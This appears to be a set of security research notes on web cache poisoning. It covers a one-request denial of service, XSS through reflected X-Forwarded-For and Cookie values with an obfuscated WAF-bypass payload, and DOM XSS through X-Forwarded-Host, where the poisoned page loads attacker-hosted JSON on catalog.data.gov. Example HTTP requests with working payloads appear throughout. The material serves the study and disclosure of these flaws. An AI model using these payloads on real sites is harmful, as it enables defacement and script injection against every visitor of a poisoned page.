## Web Cache Poisoning DoS

#### X-Forwarded-Port: invalid

**How it works:** Send a single request with a malicious HTTP header (like `X-Forwarded-Port: 123` or `Transfer-Encoding: invalid`) that causes an error response. The cache stores this error and serves it to all subsequent visitors, creating a persistent DoS with just one request.

## Cache Poisoning + XSS

#### File extensions + X-Forwarded-For

**Technique:** Researcher added cacheable file extensions (`.js`, `.css`) to URLs that normally wouldn't cache. Found that both a Cookie value and the `X-Forwarded-For` header were reflected in the response's JavaScript code, allowing XSS injection that bypassed WAF detection.

**WAF bypass trick:** Used 3 separate `X-Forwarded-For` headers to craft the payload across multiple reflections points, closing the `<script>` tag via Cookie while injecting the actual XSS via headers. The obfuscated payload avoided WAF triggers on common XSS patterns.

**Example request:**
```
GET /xyz.js?cache=key HTTP/2 
Host: Redacted
X-Forwarded-For: xss 
X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`// X-Forwarded-For: > 
Cookie: gdId=xss</script%20
```

#### DOM XSS via X-Forwarded-Host

**Attack chain:** The server trusted the `X-Forwarded-Host` header and used it to populate `data-site-root` attributes in the HTML. JavaScript then fetched a JSON file from that attacker-controlled domain and injected the response directly into the page without sanitization, causing DOM-based XSS that got cached by CloudFront.

**Exploitation:** Attacker poisoned the cache using `X-Forwarded-Host: attacker.com/malicious.json`, which made the victim's browser fetch JSON containing XSS payloads like `"show_more": "Show more <svg onload=alert(document.domain)>"`. The poisoned response was served to all users visiting that URL, effectively defacing catalog.data.gov pages.

**Example request:**
```
GET / HTTP/2
Host: catalog.data.gov'
x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php
```
**Example response:**
```
# site will take the json.php with a malicious XSS and execute it
```
